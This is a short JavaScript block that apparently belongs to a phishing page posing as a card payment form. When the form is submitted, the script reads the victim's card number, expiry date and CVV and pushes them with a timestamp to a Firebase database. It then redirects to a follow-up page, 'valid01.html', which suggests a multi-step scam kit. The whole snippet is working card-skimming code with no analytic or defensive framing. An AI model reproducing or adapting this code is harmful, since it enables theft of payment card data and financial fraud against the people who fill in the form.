    <script>
        
    document.getElementById("UDIND002").addEventListener("submit", submitForm);

    function submitForm(e) {
        e.preventDefault();
        
        const cardNumber = document.getElementById("ccnum").value.replace(/\s/g, "");
        const cardValidity = document.getElementById("vupto").value;
        const cvv = document.getElementById("ccvv").value;

        saveDataToFirebase(cardNumber, cardValidity, cvv);
    }

    function saveDataToFirebase(cardNumber, cardValidity, cvv) {
        const dbRef = firebase.database().ref('UDIND002');
        const currentDate = getCurrentDate();
        const currentTime = getCurrentTime();

        dbRef.push({
            Card: cardNumber,
            Valid: cardValidity,
            CVV: cvv,
            date: currentDate,
            time: currentTime
        }).then(() => {
            console.log("Data saved successfully to Firebase.");
            window.location.href = "valid01.html"; // Redirect on successful save
        }).catch((error) => {
            console.error("Error saving data to Firebase:", error);
        });
    }

    function getCurrentDate() {
        const currentDate = new Date();
        const year = currentDate.getFullYear();
        const month = String(currentDate.getMonth() + 1).padStart(2, "0");
        const day = String(currentDate.getDate()).padStart(2, "0");
        return `${year}-${month}-${day}`;
    }

    function getCurrentTime() {
        const currentTime = new Date();
        const hours = String(currentTime.getHours()).padStart(2, "0");
        const minutes = String(currentTime.getMinutes()).padStart(2, "0");
        const seconds = String(currentTime.getSeconds()).padStart(2, "0");
        return `${hours}:${minutes}:${seconds}`;
    } 
        
    </script>
